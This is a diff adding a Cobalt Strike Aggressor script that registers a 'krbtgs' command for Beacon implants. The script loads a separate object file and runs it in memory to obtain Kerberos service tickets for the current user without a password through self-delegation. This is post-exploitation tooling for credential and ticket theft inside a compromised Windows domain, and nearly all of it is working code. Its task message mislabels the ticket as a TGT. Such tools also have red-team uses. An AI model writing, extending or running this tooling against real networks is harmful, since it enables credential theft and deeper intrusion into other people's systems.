@@ -1,0 +1,39 @@
+#
+# Requests a TGS for the current user without
+# a password with self-delegation
+#
+alias krbtgs {
+	local('$barch $handle $object $bargs');
+
+	#
+	# Opens the COFF object file using aggresor
+	# within the same directory as the current
+	# script.
+	#
+	$barch  = barch( $1 );
+	$handle = openf( script_resource( "KrbTgsBof. $+ $barch $+ .o" ) );
+	$object = readb( $handle, -1 );
+	closef( $handle );
+
+	#
+	# Do we have an SPN argument ?
+	#
+	if ( size( @_ ) != 2 ) {
+		berror( $1, "krbtgs error: not enough arguments" );
+		return;
+	}
+
+	#
+	# Create argument buffer
+	#
+	$bargs = bof_pack( $1, "Z", $2 );
+
+	#
+	# Deploy the COFF file with relocations applied
+	# to resolve the jumps.
+	#
+	btask( $1, "Tasked Beacon to perform self-delegation to acquire a Kerberos Ticket-Granting-Ticket ( TGT )" );
+	beacon_inline_execute( $1, $object, "KrbTgsGo", $bargs );
+};
+
+beacon_command_register( "krbtgs", "Use: krbtgs [spn]" );
